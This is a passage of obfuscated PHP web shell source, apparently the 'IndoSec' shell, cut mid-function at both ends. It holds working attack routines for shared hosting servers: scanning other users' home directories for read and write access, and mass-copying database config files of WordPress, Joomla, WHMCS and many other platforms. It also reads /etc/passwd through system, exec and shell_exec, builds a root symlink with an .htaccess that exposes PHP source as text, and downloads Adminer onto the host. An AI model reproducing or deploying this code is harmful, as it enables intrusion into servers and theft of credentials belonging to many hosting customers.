while($IIIIIII1IlIl = fgets($IIIIIII1IlII)){
$IIIIIII1IlI1 = explode(':',$IIIIIII1IlIl);
$user = $IIIIIII1IlI1[0];
$IIIIIII1Illl = "/hsphere/local/home/$user";
if(is_dir($IIIIIII1Illl) === true){
$IIIIIII1Ill1 = $IIIIIII1Illl.'/'.$url;
if(is_readable($IIIIIII1Ill1)){
$IIIIIIII11I1++;
$IIIIIII1Il1I = "[<font color=green>R</font>] <a href='?dir=$IIIIIII1Ill1'><font color=#0046FF>$IIIIIII1Ill1</font></a>";
if(is_writable($IIIIIII1Ill1)){
$IIIIIII1Il1I = "[<font color=green>RW</font>] <a href='?dir=$IIIIIII1Ill1'><font color=#0046FF>$IIIIIII1Ill1</font></a>";
}
echo $IIIIIII1Il1I.'<br>';
}
}
}
}
if(!$IIIIIIII11I1 == 0){
echo "<br>Total ada $IIIIIIII11I1 KAMAR di $IIIIIIII1III";
}
echo '</pre>';
}else{
echo '<center><form method="post">
				List Domains: <br>
				<textarea name="url" class="form-control">';
$IIIIIII1Il1l = fopen('/hsphere/local/config/httpd/sites/sites.txt','r');
while($IIIIIII1Il11 = fgets($IIIIIII1Il1l)){
echo $IIIIIII1Il11;
}
echo  '</textarea><br>
				<input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
				</form></center>';
}
}elseif(preg_match('/vhosts/',$dir)){
$IIIIIII1IIl1 = explode("\r\n",$_POST['url']);
if(isset($_POST['jump'])){
echo '<pre>';
foreach($IIIIIII1IIl1 as $url){
$IIIIIII1I1II = "/var/www/vhosts/$url/httpdocs";
if(is_dir($IIIIIII1I1II) === true){
if(is_readable($IIIIIII1I1II)){
$IIIIIIII11I1++;
$IIIIIII1Il1I = "[<font color=green>R</font>] <a href='?dir=$IIIIIII1I1II'><font color=#0046FF>$IIIIIII1I1II</font></a>";
if(is_writable($IIIIIII1I1II)){
$IIIIIII1Il1I = "[<font color=green>RW</font>] <a href='?dir=$IIIIIII1I1II'><font color=#0046FF>$IIIIIII1I1II</font></a>";
}
echo $IIIIIII1Il1I.'<br>';
}
}
}
if(!$IIIIIIII11I1 == 0){
echo "<br>Total ada $IIIIIIII11I1 Kamar Di $IIIIIIII1III";
}
echo '</pre>';
}else{
echo '<center><form method="post">
				List Domains: <br>
				<textarea name="url" class="form-control">';
bing("ip:$IIIIIIII1III");
echo '</textarea><br>
				<input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
				</form></center>';
}
}else{
echo '<pre>';
$IIIIIII1II11 = fopen('/etc/passwd','r') or die("<font color=red>Can't read /etc/passwd</font><br/>");
while($passwd = fgets($IIIIIII1II11)){
if($passwd == ''||!$IIIIIII1II11){
echo "<font color=red>Can't read /etc/passwd</font><br/>";
}else{
preg_match_all('/(.*?):x:/',$passwd,$IIIIIII1I1I1);
foreach($IIIIIII1I1I1[1] as $IIIIIII1I1lI){
$IIIIIII1I1ll = "/home/$IIIIIII1I1lI/public_html";
if(is_readable($IIIIIII1I1ll)){
$IIIIIIII11I1++;
$IIIIIII1Il1I = "[<font color=green>R</font>] <a href='?dir=$IIIIIII1I1ll'><font color=#0046FF>$IIIIIII1I1ll</font></a>";
if(is_writable($IIIIIII1I1ll)){
$IIIIIII1Il1I = "[<font color=green>RW</font>] <a href='?dir=$IIIIIII1I1ll'><font color=#0046FF>$IIIIIII1I1ll</font></a>";
}
echo $IIIIIII1Il1I;
if(function_exists('posix_getpwuid')){
$IIIIIII1I1l1 = file_get_contents('/etc/named.conf');
if($IIIIIII1I1l1 == ''){
echo ' => ( <font color=red>gabisa ambil nama domain nya</font> )<br>';
}else{
preg_match_all('#/var/named/(.*?).db#',$IIIIIII1I1l1,$IIIIIII1I11I);
foreach($IIIIIII1I11I[1] as $IIIIIII1I11l){
$IIIIIII1I111 = posix_getpwuid(@fileowner("/etc/valiases/$IIIIIII1I11l"));
$IIIIIII1I111 = $IIIIIII1I111['name'];
if($IIIIIII1I111 == $IIIIIII1I1lI){
echo " => ( <u>$IIIIIII1I11l</u> )<br>";
break;
}
}
}
}else{
echo '<br>';
}
}
}
}
}
if(!$IIIIIIII11I1 == 0){
echo "<br>Total ada $IIIIIIII11I1 kamar di $IIIIIIII1III";
}
echo '</pre>';
}
echo '</div><br/>';
exit;
}
function IIIIIII1lII1($dir,$file){
if($_POST){
$passwd = $_POST['passwd'];
mkdir('indosec_config',0777);
$IIIIIII1lIlI = 'Options allnRequire NonenSatisfy Any';
$IIIIIII1lIll = fopen('indosec_config/.htaccess','w');
fwrite($IIIIIII1lIll,$IIIIIII1lIlI);
preg_match_all('/(.*?):x:/',$passwd,$IIIIIII1lIl1);
foreach($IIIIIII1lIl1[1] as $IIIIIII1lI1I){
$IIIIIII1lI1l = "/home/$IIIIIII1lI1I/public_html/";
if(is_readable($IIIIIII1lI1l)){
$IIIIIII1lI11 = array(
"/home/$IIIIIII1lI1I/.my.cnf"=>'cpanel',
"/home/$IIIIIII1lI1I/public_html/config/koneksi.php"=>'Lokomedia',
"/home/$IIIIIII1lI1I/public_html/forum/config.php"=>'phpBB',
"/home/$IIIIIII1lI1I/public_html/sites/default/settings.php"=>'Drupal',
"/home/$IIIIIII1lI1I/public_html/config/settings.inc.php"=>'PrestaShop',
"/home/$IIIIIII1lI1I/public_html/app/etc/local.xml"=>'Magento',
"/home/$IIIIIII1lI1I/public_html/admin/config.php"=>'OpenCart',
"/home/$IIIIIII1lI1I/public_html/application/config/database.php"=>'Ellislab',
"/home/$IIIIIII1lI1I/public_html/vb/includes/config.php"=>'Vbulletin',
"/home/$IIIIIII1lI1I/public_html/includes/config.php"=>'Vbulletin',
"/home/$IIIIIII1lI1I/public_html/forum/includes/config.php"=>'Vbulletin',
"/home/$IIIIIII1lI1I/public_html/forums/includes/config.php"=>'Vbulletin',
"/home/$IIIIIII1lI1I/public_html/cc/includes/config.php"=>'Vbulletin',
"/home/$IIIIIII1lI1I/public_html/inc/config.php"=>'MyBB',
"/home/$IIIIIII1lI1I/public_html/includes/configure.php"=>'OsCommerce',
"/home/$IIIIIII1lI1I/public_html/shop/includes/configure.php"=>'OsCommerce',
"/home/$IIIIIII1lI1I/public_html/os/includes/configure.php"=>'OsCommerce',
"/home/$IIIIIII1lI1I/public_html/oscom/includes/configure.php"=>'OsCommerce',
"/home/$IIIIIII1lI1I/public_html/products/includes/configure.php"=>'OsCommerce',
"/home/$IIIIIII1lI1I/public_html/cart/includes/configure.php"=>'OsCommerce',
"/home/$IIIIIII1lI1I/public_html/inc/conf_global.php"=>'IPB',
"/home/$IIIIIII1lI1I/public_html/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/wp/test/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/blog/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/beta/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/portal/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/site/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/wp/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/WP/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/news/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/wordpress/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/test/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/demo/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/home/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/v1/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/v2/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/press/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/new/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/blogs/wp-config.php"=>'Wordpress',
"/home/$IIIIIII1lI1I/public_html/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/blog/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/submitticket.php"=>'^WHMCS',
"/home/$IIIIIII1lI1I/public_html/cms/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/beta/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/portal/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/site/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/main/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/home/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/demo/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/test/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/v1/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/v2/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/joomla/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/new/configuration.php"=>'Joomla',
"/home/$IIIIIII1lI1I/public_html/WHMCS/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/whmcs1/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Whmcs/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/whmcs/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/whmcs/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/WHMC/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Whmc/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/whmc/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/WHM/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Whm/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/whm/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/HOST/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Host/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/host/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/SUPPORTES/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Supportes/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/supportes/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/domains/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/domain/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Hosting/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/HOSTING/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/hosting/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/CART/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Cart/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/cart/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/ORDER/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Order/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/order/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/CLIENT/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Client/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/client/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/CLIENTAREA/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Clientarea/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/clientarea/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/SUPPORT/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Support/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/support/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/BILLING/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Billing/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/billing/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/BUY/sumitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Buy/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/buy/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/MANAGE/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Manage/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/manage/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/CLIENTSUPPORT/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/ClientSupport/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Clientsupport/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/clientsupport/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/CHECKOUT/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Checkout/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/checkout/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/BILLINGS/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Billings/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/billings/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/BASKET/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Basket/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/basket/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/SECURE/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Secure/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/secure/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/SALES/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Sales/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/sales/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/BILL/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Bill/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/bill/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/PURCHASE/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Purchase/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/purchase/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/ACCOUNT/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Account/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/account/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/USER/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/User/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/user/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/CLIENTS/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Clients/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/clients/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/BILLINGS/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/Billings/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/billings/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/MY/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/My/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/my/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/secure/whm/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/secure/whmcs/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/panel/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/clientes/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/cliente/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/support/order/submitticket.php"=>'WHMCS',
"/home/$IIIIIII1lI1I/public_html/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/boxbilling/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/box/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/host/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/Host/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/supportes/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/support/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/hosting/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/cart/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/order/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/client/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/clients/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/cliente/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/clientes/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/billing/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/billings/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/my/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/secure/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/support/order/bb-config.php"=>'BoxBilling',
"/home/$IIIIIII1lI1I/public_html/includes/dist-configure.php"=>'Zencart',
"/home/$IIIIIII1lI1I/public_html/zencart/includes/dist-configure.php"=>'Zencart',
"/home/$IIIIIII1lI1I/public_html/products/includes/dist-configure.php"=>'Zencart',
"/home/$IIIIIII1lI1I/public_html/cart/includes/dist-configure.php"=>'Zencart',
"/home/$IIIIIII1lI1I/public_html/shop/includes/dist-configure.php"=>'Zencart',
"/home/$IIIIIII1lI1I/public_html/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/hostbills/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/host/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/Host/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/supportes/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/support/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/hosting/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/cart/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/order/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/client/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/clients/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/cliente/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/clientes/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/billing/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/billings/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/my/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/secure/includes/iso4217.php"=>'Hostbills',
"/home/$IIIIIII1lI1I/public_html/support/order/includes/iso4217.php"=>'Hostbills'
);
foreach($IIIIIII1lI11 as $config =>$IIIIIII1llIl){
$IIIIIII1llI1 = file_get_contents($config);
if($IIIIIII1llI1 == ''){
}else{
$IIIIIII1lllI = fopen("indosec_config/$IIIIIII1lI1I-$IIIIIII1llIl.txt",'w');
fputs($IIIIIII1lllI,$IIIIIII1llI1);
}
}
}
}
echo "<p class='text-center'>Success Get Config!!</p>
<a href='?dir=$dir/indosec_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
}else{
echo "<form method='post'>
	<p class='text-danger'>/etc/passwd error ?  <a href='?dir=$dir&aksi=passwbypass'>Bypass Here</a></p>
	<textarea name='passwd' class='form-control' rows='13'>".file_get_contents('/etc/passwd')."</textarea><br/>
	<input type='submit' class='btn btn-danger btn-block' value='Get Config!!'>
	</form>";
}
exit;
}
function IIIIIII1lll1($dir,$file){
echo '<div claas="container">
	<form method="POST">
	<p class="text-center">Bypass etc/passwd With :</p>
	<div class="d-flex justify-content-center flex-wrap">
	<input type="submit" class="fiture btn btn-danger btn-sm" value="System Function" name="syst">
	<input type="submit" class="fiture btn btn-danger btn-sm" value="Passthru Function" name="passth">
	<input type="submit" class="fiture btn btn-danger btn-sm" value="Exec Function" name="ex">
	<input type="submit" class="fiture btn btn-danger btn-sm" value="Shell_exec Function" name="shex">
	<input type="submit" class="fiture btn btn-danger btn-sm" value="Posix_getpwuid Function" name="melex">
	</div><hr/>
	<p class="text-center">Bypass User With :</p>
	<div class="d-flex justify-content-center flex-wrap">
	<input type="submit" class="fiture btn btn-warning btn-sm" value="Awk Program" name="awkuser">
	<input type="submit" class="fiture btn btn-warning btn-sm" value="System Function" name="systuser">
	<input type="submit" class="fiture btn btn-warning btn-sm" value="Passthru Function" name="passthuser">	
	<input type="submit" class="fiture btn btn-warning btn-sm" value="Exec Function" name="exuser">		
	<input type="submit" class="fiture btn btn-warning btn-sm" value="Shell_exec Function" name="shexuser">
	</div>
	</form>';
$mail = 'ls /var/mail';
$IIIIIII1ll1I = '/etc/passwd';
if($_POST['syst']){
echo"<textarea class='form-control' rows='13'>";
echo system("cat $IIIIIII1ll1I");
echo'</textarea><br/>';
}
if($_POST['passth']){
echo"<textarea class='form-control' rows='13'>";
echo passthru("cat $IIIIIII1ll1I");
echo'</textarea><br/>';
}
if($_POST['ex']){
echo"<textarea class='form-control' rows='13'>";
echo exec("cat $IIIIIII1ll1I");
echo'</textarea><br/>';
}
if($_POST['shex']){
echo"<textarea class='form-control' rows='13'>";
echo shell_exec("cat $IIIIIII1ll1I");
echo'</textarea><br/>';
}
if($_POST['melex']){
echo"<textarea class='form-control' rows='13'>";
for($IIIIIII1ll1l=0;$IIIIIII1ll1l<6000;$IIIIIII1ll1l++){
$IIIIIII1ll11 = posix_getpwuid($IIIIIII1ll1l);
if (!empty($IIIIIII1ll11)){
while (list ($IIIIIII1l1II,$IIIIIII1l1Il) = each($IIIIIII1ll11)){
print "$IIIIIII1l1Il:";
}
print 'n';
}
}
echo'</textarea><br/>';
}
if ($_POST['awkuser']){
echo"<textarea class='form-control' rows='13'>
		".shell_exec("awk -F: '{ print $IIIIIII1l1I1 }' $IIIIIII1ll1I | sort").'
		</textarea><br/>';
}
if ($_POST['systuser']){
echo"<textarea class='form-control' rows='13'>";
echo system("$mail");
echo '</textarea><br>';
}
if ($_POST['passthuser']){
echo"<textarea class='form-control' rows='13'>";
echo passthru("$mail");
echo '</textarea><br>';
}
if ($_POST['exuser']){
echo"<textarea class='form-control' rows='13'>";
echo exec("$mail");
echo '</textarea><br>';
}
if ($_POST['shexuser']){
echo"<textarea class='form-control' rows='13'>";
echo shell_exec("$mail");
echo '</textarea><br>';
}
echo '</div>';
exit;
}
function IIIIIII1l1lI($dir,$file){
$IIIIIII1l1ll = str_replace($_SERVER['DOCUMENT_ROOT'],'',$dir);
function adminer($url,$isi){
$IIIIIII1Il1l = fopen($isi,'w');
$IIIIIIllIIII = curl_init();
curl_setopt($IIIIIIllIIII,CURLOPT_URL,$url);
curl_setopt($IIIIIIllIIII,CURLOPT_BINARYTRANSFER,true);
curl_setopt($IIIIIIllIIII,CURLOPT_RETURNTRANSFER,true);
curl_setopt($IIIIIIllIIII,CURLOPT_SSL_VERIFYPEER,false);
curl_setopt($IIIIIIllIIII,CURLOPT_FILE,$IIIIIII1Il1l);
return curl_exec($IIIIIIllIIII);
curl_close($IIIIIIllIIII);
fclose($IIIIIII1Il1l);
ob_flush();
flush();
}
if(file_exists('adminer.php')){
echo "<a href='$IIIIIII1l1ll/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
}else{
if(adminer('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php','adminer.php')){
echo "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$IIIIIII1l1ll/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
}else{
echo "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";
}
}
exit;
}
function IIIIIII1l1l1($dir,$file){
$IIIIIII1l1ll = str_replace($_SERVER['DOCUMENT_ROOT'],'',$dir);
$IIIIIIIlIIl1 = @file('/etc/named.conf');
if(!$IIIIIIIlIIl1){
die ("[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]<br/><font color='red'>Error tidak dapat membaca  /etc/named.conf</font><br/><br/>");
}
if($IIIIIIIlIIl1){
@mkdir('indosec_sym',0777);
@chdir('indosec_sym');
@IIIIIIIII1lI('ln -s / root');
$IIIIIII1l11I = 'Options Indexes FollowSymLinks
		DirectoryIndex indsc.html
		AddType text/plain php html php5 phtml
		AddHandler text/plain php html php5 phtml
		Satisfy Any';
$IIIIIII1l11l = fopen('.htaccess','w');
$IIIIIII1l111 = fwrite($IIIIIII1l11l,$IIIIIII1l11I);@fclose($IIIIIII1l11l);
echo "[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]
		<div class='tmp'>
		<table class='text-center table-responsive'>
		<thead class='bg-info'>
		<th>No.</th>
		<th>Domains</th>
		<th>Users</th>
		<th>symlink </th>
		</thead>";
$IIIIIII11IIl = 1;
foreach($IIIIIIIlIIl1 as $IIIIIIIlIlII){
if(eregi('zone',$IIIIIIIlIlII)){
preg_match_all('#zone "(.*)"#',$IIIIIIIlIlII,$IIIIIIIlIllI);
flush();
if(strlen(trim($IIIIIIIlIllI[1][0])) >2){
$user = posix_getpwuid(@fileowner('/etc/valiases/'.$IIIIIIIlIllI[1][0]));
echo '<tr>
					<td>'.$IIIIIII11IIl."</td>
					<td class='text-left'><a href=http://www.".$IIIIIIIlIllI[1][0].'/>'.$IIIIIIIlIllI[1][0].'</a></td>
					<td>'.$user['name']."</td>
					<td><a href='$IIIIIII1l1ll/indosec_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
					</tr>";
flush();
$IIIIIII11IIl++;
}
}
}
echo '</table></div>';
}else{
$IIIIIII11IlI = @file('/etc/passwd');
if ($IIIIIII11IlI){
@mkdir('indosec_sym',0777);
@chdir('indosec_sym');
@IIIIIIIII1lI('ln -s / root');
$IIIIIII1l11I = 'Options Indexes FollowSymLinks
			DirectoryIndex indsc.html
			AddType text/plain php html php5 phtml
			AddHandler text/plain php html php5 phtml
			Satisfy Any';
$IIIIIII1l11l = fopen('.htaccess','w');
$IIIIIII1l111 = fwrite($IIIIIII1l11l,$IIIIIII1l11I);
@fclose($IIIIIII1l11l);
echo "[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]
			<div class='tmp'>
			<table class='text-center table-responsive'>
			<thead class='bg-warning'>
			<th>No.</th>
			<th>Users</th>
			<th>symlink </th>
			</thead>";
$IIIIIII11IIl = 1;
$file = fopen('/etc/passwd','r') or exit('Unable to open file!');
while(!feof($file)){
$s = fgets($file);
$IIIIIII11Il1 = array();
$t = preg_match('/\/(.*?)\:\//s',$s,$IIIIIII11Il1);
$IIIIIII11Il1 = str_replace('home/','',$IIIIIII11Il1[1]);
if(strlen($IIIIIII11Il1) >12 ||strlen($IIIIIII11Il1) == 0 ||$IIIIIII11Il1 == 'bin'||$IIIIIII11Il1 == 'etc/X11/fs'||$IIIIIII11Il1 == 'var/lib/nfs'||$IIIIIII11Il1 == 'var/arpwatch'||$IIIIIII11Il1 == 'var/gopher'||$IIIIIII11Il1 == 'sbin'||$IIIIIII11Il1 == 'var/adm'||$IIIIIII11Il1 == 'usr/games'||$IIIIIII11Il1 == 'var/ftp'||$IIIIIII11Il1 == 'etc/ntp'||$IIIIIII11Il1 == 'var/www'||$IIIIIII11Il1 == 'var/named')
continue;
echo '<tr>
				<td>'.$IIIIIII11IIl.'</td>
				<td>'.$IIIIIII11Il1."</td>
				<td><a href=$IIIIIII1l1ll/indosec_sym/root/home/".$IIIIIII11Il1."/public_html target='_blank'>Symlink</a></td>
				</tr>";
$IIIIIII11IIl++;
}
